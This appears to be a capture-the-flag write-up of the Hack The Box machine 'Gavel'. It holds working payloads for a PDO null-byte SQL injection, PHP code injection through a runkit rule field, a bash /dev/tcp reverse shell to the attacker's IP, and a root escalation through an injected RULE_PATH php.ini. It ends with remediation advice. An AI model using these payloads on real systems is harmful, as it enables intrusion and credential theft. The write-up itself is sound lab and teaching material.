---
title: "HTB - Gavel"
date: 2026-03-16
description: "Medium Linux machine featuring .git source disclosure, a novel PDO SQLi null-byte/backslash bypass, bcrypt cracking, RCE via PHP runkit_function_add, and root through an unchecked RULE_PATH environment variable passed to a privileged daemon."
tags: ["htb", "linux", "medium", "sqli", "php", "runkit", "git-dumper", "pdo", "privesc"]
tools: ["rustscan", "ffuf", "git-dumper", "hashcat"]
---

Gavel is a Medium-difficulty Linux machine built around a fantasy auction platform. The attack chain moves from an exposed `.git` directory to a novel PDO SQLi bypass that tools like sqlmap cannot find, then to remote code execution via PHP's `runkit_function_add`, and finally to root through an environment variable that an unprivileged user can inject into a root-owned daemon.

{{< htb-box-info
  name="Gavel"
  avatar="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2e446c813e2fa67622764672b9df57bb.png"
  os="Linux"
  difficulty="Medium"
  release="29 Nov 2025"
  retire="14 Mar 2026"
  user_blood="r34w0k3n"
  user_blood_url="https://app.hackthebox.com/users/2302404"
  user_blood_img="https://account.hackthebox.com/storage/users/1895157f-acec-4711-a78d-e749c39e8f2f-avatar.png"
  user_blood_time="00:55:28"
  root_blood="NLTE"
  root_blood_url="https://app.hackthebox.com/users/260094"
  root_blood_img="https://account.hackthebox.com/storage/users/5106f57b-8e24-4238-b682-0bf5f1a7baec-avatar.png"
  root_blood_time="01:41:31"
  creator="Shadow21A"
  creator_url="https://app.hackthebox.com/users/1317214"
  creator_img="https://account.hackthebox.com/storage/users/6456e3d5-2f2e-4b6f-96be-47be657907c6-avatar.png"
>}}

---

## Enumeration

### Port Scan

Two ports open. SSH on 22 and HTTP on 80:

```bash
rustscan -a 10.129.242.203 -- -sCV
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|   256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://gavel.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The OpenSSH version pins this to Ubuntu 22.04 (Jammy). Port 80 redirects to `gavel.htb`, so I add that to `/etc/hosts`.

### Web Application

Browsing to `http://gavel.htb/` lands on a fantasy auction platform. The theme is self-aware about it: the register page reads "bid on items that are probably fine, mostly not cursed, and won't summon an ancient evil." The pages present are:

- `/login.php`: login form
- `/register.php`: account creation, gives new users 50,000 coins
- `/inventory.php`: shows your items, with a sort dropdown
- `/bidding.php`: live auctions with a countdown timer per item
- `/admin.php`: admin panel, gated to the `auctioneer` role

![Gavel auction platform homepage](/images/gavel/gavel-homepage.png)

Browsing further reveals a login page and a register page where new accounts get 50,000 coins to start bidding.

![Gavel register page](/images/gavel/gavel-register.png)

I register an account and poke around. The bidding page shows one or more active auctions with a current price, time remaining, and a bid field. The admin panel redirects me back to the index when I try to access it. The inventory page has a "Sort by" dropdown with two options: Name and Quantity.

![Your inventory page](/images/gavel/gavel-inventory.png)

### Directory Fuzzing

```bash
ffuf -u http://gavel.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

```
assets              [Status: 301, Size: 311]
includes            [Status: 301, Size: 313]
rules               [Status: 301, Size: 310]
server-status       [Status: 403, Size: 277]
```

`assets` is the CSS/JS/image directory, `includes` has the backend PHP files. The `rules` directory stands out as something application-specific. Browsing it shows a directory listing with two files: `.htaccess` and `default.yaml`.

The `.htaccess` in `rules/` blocks web access to `.yaml` files, so direct fetching of `default.yaml` returns 403. That is interesting but easy to note and move on from.

More interesting: checking for a `.git` directory:

```bash
curl -si http://gavel.htb/.git/HEAD
```

```
HTTP/1.1 200 OK
...
ref: refs/heads/master
```

The `.git` directory is publicly accessible. That means the complete repository history can be dumped.

### Source Code Disclosure

#### Dumping the Repository

```bash
git-dumper http://gavel.htb/.git gave_git/
```

This reconstructs the full working tree locally. The repo has three commits:

```
$ git log --oneline
f67d907 ..
2bd167f .
ff27a16 gavel auction ready
```

The commit messages are not helpful, but the diff between the first two meaningful commits (`ff27a16` and `2bd167f`) shows only one change: a message string in `rules/default.yaml` was updated. The third commit (`f67d907`) is also a dot commit with no tracked file changes. Nothing sensitive in the diff, but the git history confirms this is an early-stage deployment with the full application committed in one shot.

#### File Structure

``` {linenos=table}
gave_git/
  admin.php
  bidding.php
  index.php
  inventory.php
  login.php
  logout.php
  register.php
  includes/
    auction.php
    auction_watcher.php
    bid_handler.php
    config.php
    db.php
    session.php
  rules/
    default.yaml
    .htaccess
  assets/
    ...
```

#### config.php

```php
define('DB_HOST', 'localhost');
define('DB_NAME', 'gavel');
define('DB_USER', 'gavel');
define('DB_PASS', 'gavel');
```

Hardcoded database credentials. DB name is `gavel`, user is `gavel`, password is `gavel`. This immediately tells me the database schema to target.

#### db.php

Uses PDO (PHP Data Objects), which is PHP's database abstraction layer:

```php
$pdo = new PDO(
    "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8",
    DB_USER,
    DB_PASS
);
```

No explicit `PDO::ATTR_EMULATE_PREPARES` setting, which means it defaults to `true`. Emulated prepares are on. This matters a lot for what comes next.

#### login.php

All parameterized, nothing to attack here:

```php
$stmt = $pdo->prepare("SELECT id, password, role FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if ($user && password_verify($password, $user['password'])) { ... }
```

#### register.php

Also clean. New users are assigned role `user` and given 50,000 coins.

#### inventory.php

This is where things get interesting. The `sort` and `user_id` parameters are handled like this:

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId   = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
```

Two things stand out:

1. `$col` is user-controlled with one restriction: any backtick in `$sortItem` is stripped, then the remaining string is wrapped in backticks. The intent is to prevent injection by treating the column name as a MySQL identifier. In MySQL, backtick-quoted identifiers cannot be escaped with a backtick character, so this looks solid.

2. `$userId` comes straight from the request with no validation at all. When `user_id` is passed via GET or POST, it overrides the session value. That is a plain IDOR (Insecure Direct Object Reference). Any authenticated user can query another user's inventory by passing a different `user_id`. Not directly exploitable for credential theft, but useful.

The `$col` injection is the real target. The question is how to break out of the backtick quoting without using a backtick.

#### bid_handler.php

The most dangerous file in the codebase:

```php {linenos=table}
$rule = $auction['rule'];
$rule_message = $auction['message'];
$allowed = false;

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    error_log("Rule error: " . $e->getMessage());
    $allowed = false;
}
```

`runkit_function_add` creates a PHP function at runtime using the string from the database as the function body. This is arbitrary PHP code execution. Whatever is in the `rule` column runs when a bid is placed. The `rule` column is set via `admin.php`, which is only accessible to users with `role = 'auctioneer'`. So the chain is: get an auctioneer account, set a malicious rule, place a bid, get RCE.

One important constraint: the code checks `$allowed` after the rule runs. If `$allowed` is false, the request exits before the bid is recorded. If the injected code fires a reverse shell via `shell_exec`, execution never returns normally, so `$allowed` stays false, but the shell will have already fired. Adding `return true;` to the injected code is not required for the shell to work, but it makes the flow cleaner if something goes wrong with the shell connection.

#### admin.php

```php
if (!isset($_SESSION['user']) || $_SESSION['user']['role'] !== 'auctioneer') {
    header('Location: index.php');
    exit;
}
// ...
$stmt = $pdo->prepare("UPDATE auctions SET rule = ?, message = ? WHERE id = ?");
$stmt->execute([$rule, $message, $auction_id]);
```

The rule update query is properly parameterized. The PHP `$rule` value is stored safely in the database. The vulnerability is not in the storage. It is in the retrieval and execution in `bid_handler.php`.

One interesting detail in the HTML: the existing rule value is commented out in the form:

```html
<!-- p class="mb-1 text-justify"><strong>Rule:</strong> <code lang="php"><?= htmlspecialchars($auction['rule']) ?></code></p -->
```

The current rule is not displayed to the auctioneer in the UI. That is a minor annoyance but not a blocker.

#### rules/default.yaml

```yaml
rules:
  - rule: "return $current_bid >= $previous_bid * 1.1;"
    message: "Bid at least 10% more than the current price."

  - rule: "return $current_bid % 5 == 0;"
    message: "Bids must be in multiples of 5."

  - rule: "return $current_bid >= $previous_bid + 5000;"
    message: "Only bids greater than 5000 + current bid will be considered."
```

This shows the format for legitimate rules. The `gavel-util` binary (seen later in the privesc path) accepts YAML files in this format to submit auction items. The rules are pure PHP expressions that return true or false.

---

## Foothold

### SQL Injection: PDO Emulated Prepare Bypass

The injection in `inventory.php` looks protected: backticks are stripped and the value is re-wrapped in backticks, so the column name becomes a MySQL identifier. Standard SQL injection tricks like `UNION SELECT` require breaking out of the identifier quoting, and breaking out of a backtick identifier in MySQL requires a backtick character, which is filtered.

The bypass chains two obscure behaviors together.

**Part 1: PDO emulated prepare placeholder scanning**

When `PDO::ATTR_EMULATE_PREPARES` is true (the default in PHP's MySQL driver), PDO handles `?` substitution itself in PHP before sending the query to the database. It scans the query string looking for `?` placeholders to replace with bound parameter values. The scanner does not perfectly handle all quoting contexts. Specifically, it treats `\?` as an escaped question mark (not a placeholder) in most contexts, but when a null byte appears in the query string, the scanner's context tracking can get confused.

**Part 2: MySQL null byte in backtick identifiers**

MySQL's backtick-quoted identifiers are terminated by a null byte (`\x00`). If a null byte appears inside a backtick string, MySQL treats everything after the null byte as outside the identifier, as raw SQL.

Putting these together, tracing through the PHP code with the payload:

1. `$sortItem` = `\?;-- -` + NUL byte
2. No backticks in `$sortItem`, so `str_replace` changes nothing
3. `$col` = `` `\?;-- -[NUL]` ``
4. The query string becomes: `` SELECT `\?;-- -[NUL]` FROM inventory WHERE user_id = ? ORDER BY item_name ASC ``

PDO's placeholder scanner processes this:
- It sees `\?` inside the backtick identifier and, due to the `\` escape, treats it as placeholder #1 rather than an escaped literal
- The entire `user_id` value gets substituted as a raw string in place of that `?`, injecting the subquery directly into the query

MySQL receives (simplified):

```sql
SELECT `x` FROM (SELECT VERSION() AS `'x`)y;-- -
```

The null byte terminated the backtick identifier early. The closing backtick PHP added after the null byte is now outside the identifier context, and it pairs with the backtick in the injected `user_id` value to close the subquery alias. The `-- -` comments out the remainder.

The response renders the `VERSION()` output as an item name in the inventory page:

```
http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+VERSION()+AS+`%27x`)y;--+-
```

![VERSION() output rendered in inventory](/images/gavel/gavel-basic-poc.png)

sqlmap will not find this because its payloads never contain `\?` followed by a null byte inside a backtick-wrapped string. This technique was documented by Searchlight Cyber as a novel PDO interaction.

### Enumerating the Database

With injection confirmed via `VERSION()`, I enumerate the database structure.

Get the list of tables in the `gavel` schema:

```
http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+GROUP_CONCAT(table_name)+AS+`'x`+FROM+information_schema.tables+WHERE+table_schema=database())y;--+-
```

Response shows tables: `auctions,inventory,items,users`

![Table list from information_schema](/images/gavel/gavel-sqli-version.png)

Get columns from `users`:

```
http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+GROUP_CONCAT(column_name)+AS+`'x`+FROM+information_schema.columns+WHERE+table_name=0x7573657273)y;--+-
```

(`0x7573657273` is `users` hex-encoded to avoid quotes)

Response: `id,username,password,role,created_at,money`

![Columns from users table](/images/gavel/gavel-sqli-columns.png)

Extract the auctioneer credential:

```
http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+CONCAT(username,0x3a,password)+AS+`'x`+FROM+users+LIMIT+1+OFFSET+0)y;--+-
```

The inventory page renders:

```
auctioneer:$2y$10$<hash>
```

![Credential dump from users table](/images/gavel/gavel-sqli-creds.png)

### Hash Cracking

The hash is bcrypt (`$2y$10$`). Hashcat mode 3200 handles bcrypt:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```
$2y$10$...:midnight1
```

Cracks in a few minutes.

### RCE via runkit_function_add

I log in as `auctioneer` / `midnight1`. The sidebar now shows "Admin Panel". Navigating to `/bidding.php` shows the live auctions as the auctioneer.

![Live auction page as auctioneer](/images/gavel/gavel-bidding.png)

On `/admin.php`, there are auction cards, each with a rule input field and a message input field.

![Admin panel rule field](/images/gavel/gavel-admin.png)

From the source code review, `bid_handler.php` loads the rule associated with the auction as a PHP function and runs it against the bid:

```php {linenos=table}
$rule = $auction['rule'];
$rule_message = $auction['message'];

$allowed = false;

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    error_log("Rule error: " . $e->getMessage());
    $allowed = false;
}

if (!$allowed) {
    echo json_encode(['success' => false, 'message' => $rule_message]);
    exit;
}
```

Since I can now set the rule as the auctioneer, I can inject arbitrary PHP. The result of `$allowed` is never sent back, so to confirm execution I need an out-of-band signal. I'll test with a ping first.

Start a tcpdump listener on tun0:

```bash
sudo tcpdump -ni tun0 icmp
```

Set the rule to:

```php
system('ping -c 1 10.10.14.60'); return true;
```

Then navigate to the bidding page and place a bid higher than the current price. The bid triggers `bid_handler.php`, which runs the rule. On the listener:

```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:11:57.577739 IP 10.129.15.156 > 10.10.14.60: ICMP echo request, id 2, seq 1, length 64
23:11:57.577763 IP 10.10.14.60 > 10.129.15.156: ICMP echo reply, id 2, seq 1, length 64
```

RCE confirmed. Now swap the rule for a reverse shell.

Set up a listener:

```bash
rlwrap -cAr nc -lvnp 2614
```

Update the rule to:

```php
shell_exec('bash -c "bash -i >& /dev/tcp/10.10.14.26/2614 0>&1"'); return true;
```

Submit and place another bid. Shell comes back:

```
www-data@gavel:/var/www/html/gavel/includes$
```

### Lateral Movement

With a `www-data` shell, I check what users exist:

```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

```
root:x:0:0:root:/root:/bin/bash
auctioneer:x:1001:1001::/home/auctioneer:/bin/bash
```

The auctioneer's web password is `midnight1`. Trying it for system login:

```bash
su - auctioneer
Password: midnight1
```

It works. Password reuse between the web application and the system account. User flag is in `/home/auctioneer/user.txt`:

```
b8c3****************************
```

### SSH Attempt (Blocked)

Before settling into the reverse shell, I try SSH for a cleaner terminal:

```bash
ssh auctioneer@10.129.242.203
```

```
auctioneer@10.129.242.203: Permission denied (publickey).
```

Even with the correct password, it fails immediately. The server is not offering password authentication. The reason is in `/etc/ssh/sshd_config`:

```bash
grep -i -E "allowusers|denyusers|allowgroups|denygroups" /etc/ssh/sshd_config
```

```
DenyUsers auctioneer
```

`DenyUsers` blocks the named account from authenticating via SSH by any method: password, key, certificate, everything. It is checked before any authentication happens. The only way in is the reverse shell.

### PTY Upgrade

The reverse shell from Apache is not a proper terminal. Upgrading:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then `Ctrl+Z` to background it, and on the local machine:

```bash
stty raw -echo; fg
```

Type `reset`, hit Enter, then:

```bash
export TERM=xterm
export SHELL=bash
```

Now arrow keys, tab completion, and `Ctrl+C` all work properly.

---

## Privilege Escalation

### Enumeration

Running `ps aux` shows a process that stands out:

```
root       829  0.0  0.3  gaveld --socket /var/run/gaveld.sock
```

A root-owned daemon named `gaveld` listening on a UNIX socket. Looking for related binaries:

```bash
ls -la /usr/local/bin/
```

```
-rwxr-xr-x 1 root root ... gavel-util
```

`gavel-util` is a client for the daemon. Running it with no arguments:

```
Usage: gavel-util <command> [args]
  submit <file.yaml>   Submit an auction item for review
  stats                Show active auction statistics
  invoice <id>         Generate invoice for auction ID
```

`stats` works fine. `submit` takes a YAML file and sends the contents to the daemon over `/var/run/gaveld.sock`.

Checking SUID binaries for completeness:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Nothing unusual in the standard list. The privesc runs through `gaveld`.

### Checking the Default php.ini

```bash
cat /opt/gavel/.config/php/php.ini
```

```ini
open_basedir=/opt/gavel
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,pcntl_exec,mail,putenv,dl
```

Most dangerous functions are disabled. `open_basedir` restricts PHP to `/opt/gavel`. Notably, `file_put_contents` is not in `disable_functions`, which means a two-hop unintended path exists: submit a rule that overwrites the ini itself using `file_put_contents`, then submit a second rule with unrestricted functions. But the intended path is cleaner.

### Exploiting RULE_PATH

Write a permissive ini somewhere world-writable:

```bash
cat > /dev/shm/php.ini << 'EOF'
engine=On
open_basedir=
disable_functions=
EOF
```

Write the malicious YAML. The rule copies bash with SUID permissions:

```bash
cat > /dev/shm/setuid.yaml << 'EOF'
name: "privesc"
description: "pwn"
image: "https://example.com/x.png"
price: 100000
rule_msg: "oops"
rule: "system('cp /bin/bash /home/auctioneer/darkness; chmod 6777 /home/auctioneer/darkness;'); return false;"
EOF
```

Submit with `RULE_PATH` set in the environment:

```bash
RULE_PATH=/dev/shm/php.ini gavel-util submit /dev/shm/setuid.yaml
```

```
Item submitted for review in next auction
```

Check the result:

```bash
ls -la ~/darkness
```

```
-rwsrwsrwx 1 root root 1396520 Mar 16 09:46 darkness
```

The daemon accepted the rule with `disable_functions=` empty, so `system()` ran as root and created a setuid/setgid copy of bash owned by root.

### Root Shell

Running `./darkness -p` drops into the SUID bash, but immediately spawning a new interactive bash from inside it drops the elevated euid. The trick is to use `-c 'bash -p'` to spawn a child bash that also preserves SUID privileges:

```bash
./darkness -p -c 'bash -p'
```

```bash
id
uid=1001(auctioneer) euid=0(root) egid=0(root) groups=0(root),1001(auctioneer)
```

```bash
cat /root/root.txt
```

```
c89a****************************
```

### Beyond Root: PrivateTmp

During the exploit, I initially tried writing the YAML to `/tmp` from the `www-data` shell. Even though `/tmp` exists and is writable, `gavel-util` could not find the file. The reason is Apache's systemd unit:

```
/lib/systemd/system/apache2.service:
  PrivateTmp=true
```

`PrivateTmp=true` gives the Apache service its own private `/tmp` and `/var/tmp` namespace. From `www-data`'s perspective, `/tmp` looks like a normal world-writable directory. But at the kernel level it is a private mount only visible to processes in Apache's mount namespace. When `auctioneer` runs `gavel-util` (in the default system namespace), it cannot see files written to Apache's private `/tmp`.

This is why `/dev/shm` works as the staging directory. It is a `tmpfs` mount in the global mount namespace, visible to all processes on the system.

---

## Summary

| Step | Detail |
|------|--------|
| Source disclosure | `.git` directory exposed, full source recovered with git-dumper |
| SQLi | PDO emulated prepare + null byte terminates backtick identifier, `\?` maps user_id into query body |
| Credential extraction | Subquery against `users` table, `role=0x61756374696f6e656572` |
| Hash crack | bcrypt cracked: `midnight1` |
| RCE | `runkit_function_add` executes rule field as PHP; reverse shell via `shell_exec` |
| Lateral movement | Password reuse: `su - auctioneer` with web password |
| PrivEsc | `RULE_PATH` env var passed by `gavel-util` to `gaveld`; custom php.ini disables sandbox |
| Root | SUID bash: `./darkness -p -c 'bash -p'` |

## Key Takeaways

**Exposed .git directory**: The entire attack depends on this. Without source code, the PDO quirk in the SQLi would be essentially undetectable by automation, and the `runkit_function_add` sink would not be known. In production, the web root should never be a git working directory. If it must be, the server should deny requests to any path starting with `.git`.

**PDO emulated prepares and structural injection**: The developer's backtick sanitization was correct in concept: strip the dangerous character, wrap in the quoting context. Where it failed is the assumption that the quoting context is entirely under MySQL's control. With emulated prepares on, PHP performs a first pass over the query string before MySQL sees it. That pass has its own quirks around escape sequences and null bytes. The real fix is twofold: set `PDO::ATTR_EMULATE_PREPARES = false` so MySQL handles all placeholder parsing, and validate the `sort` parameter against an explicit allowlist. There are exactly two valid sort values here. Checking against those eliminates the attack surface entirely.

**runkit_function_add as code execution**: Storing PHP code in a database and executing it at runtime is a pattern that should never appear in production. The `rule` field is conceptually a business logic expression, but it is implemented as arbitrary PHP with no sandboxing at the application layer. Even a proper expression sandbox (like Symfony's ExpressionLanguage component) would be dramatically safer. The minimal fix is strict server-side validation before storage: parse and check the rule against a whitelist of allowed constructs before writing to the `auctions` table.

**Environment variable injection into privileged daemons**: The `RULE_PATH` bug demonstrates a class of privilege escalation that is easy to overlook. The daemon correctly sandboxes PHP execution with a restrictive ini. But then it trusts the caller — an unprivileged user — to supply the path to that ini via an environment variable. A privileged service should never derive security-critical configuration from caller-supplied input. The ini path should be hardcoded or read from a root-controlled configuration file that the calling user cannot influence. Any data that arrives from an unprivileged caller, including environment variables, should be treated as untrusted.
